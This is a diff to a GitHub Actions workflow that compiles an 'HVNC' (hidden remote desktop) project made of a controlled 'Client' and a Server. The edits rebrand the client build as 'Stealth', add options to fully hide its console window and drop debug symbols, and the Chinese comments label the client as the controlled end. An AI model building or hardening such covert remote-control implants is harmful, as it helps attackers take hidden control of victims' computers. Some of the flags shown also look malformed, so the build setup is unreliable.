@@ -1,4 +1,4 @@
-name: Build HVNC Project (Final Stable)
+name: Build HVNC Project (Stealth Client, Official Standard)
 on:
   push:
     branches: [ "main" ]
@@ -25,8 +25,8 @@ jobs:
           New-Item -Path "${{ github.workspace }}\build_output\Client" -ItemType Directory -Force
           New-Item -Path "${{ github.workspace }}\build_output\Server" -ItemType Directory -Force
 
-      # 被控端（Client）：无控制台、无PDB、无优化、静态链接
-      - name: Build Client (No Console, No PDB, No Optimization)
+      # 被控端（Client）：彻底隐藏控制台、无PDB、无优化、静态链接
+      - name: Build Client (Stealth, No PDB, No Optimization)
         run: |
           msbuild Client/HVNC.vcxproj `
             /p:Configuration=Release `
@@ -37,8 +37,9 @@ jobs:
             /p:Optimize=false `
             /p:LinkTimeCodeGeneration=false `
             /p:GenerateDebugInformation=false `
-            /p:SubSystem=Windows `
-            /p:AdditionalLinkerOptions="'/Od /OPT:NOREF /OPT:NOICF /WHOLEARCHIVE'" `
+            /p:SubSystem=Windows `  # 官方参数：强制Windows子系统
+            /p:EntryPoint=WinMainCRTStartup `  # 官方参数：强制GUI入口点，彻底隐藏控制台
+            /p:AdditionalLinkerOptions="/Od /OPT:NOREF /OPT:NOICF /WHOLEARCHIVE" `
             /nologo `
             /verbosity:minimal
 
@@ -54,7 +55,7 @@ jobs:
             /p:Optimize=false `
             /p:LinkTimeCodeGeneration=false `
             /p:GenerateDebugInformation=false `
-            /p:AdditionalLinkerOptions="'/Od /OPT:NOREF /OPT:NOICF /WHOLEARCHIVE'" `
+            /p:AdditionalLinkerOptions="/Od /OPT:NOREF /OPT:NOICF /WHOLEARCHIVE" `
             /nologo `
             /verbosity:minimal
 
@@ -66,13 +67,13 @@ jobs:
       - name: Upload Client artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: HVNC-Client-Stealth
+          name: HVNC-Client-Stealth-Final
           path: ${{ github.workspace }}\build_output\Client\
           retention-days: 7
 
       - name: Upload Server artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: HVNC-Server-Debug
+          name: HVNC-Server-Debug-Final
           path: ${{ github.workspace }}\build_output\Server\
           retention-days: 7
